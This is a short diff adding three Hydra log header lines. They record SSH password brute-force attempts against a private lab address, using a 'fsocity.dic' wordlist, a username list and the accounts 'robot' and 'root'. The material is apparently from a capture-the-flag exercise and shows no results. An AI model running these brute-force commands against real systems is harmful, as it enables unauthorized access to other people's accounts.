@@ -1,0 +1,3 @@
+# Hydra v9.6 run at 2026-05-28 00:56:45 on 10.49.150.230 ssh (hydra -L username.txt -P fsocity.dic -o brute_force_ssh.txt 10.49.150.230 ssh)
+# Hydra v9.6 run at 2026-05-28 01:03:20 on 10.49.150.230 ssh (hydra -l robot -P fsocity.dic -o brute_force_ssh.txt 10.49.150.230 ssh)
+# Hydra v9.6 run at 2026-05-28 01:25:39 on 10.49.150.230 ssh (hydra -l root -P fsocity.dic -o brute_force_ssh.txt 10.49.150.230 ssh)
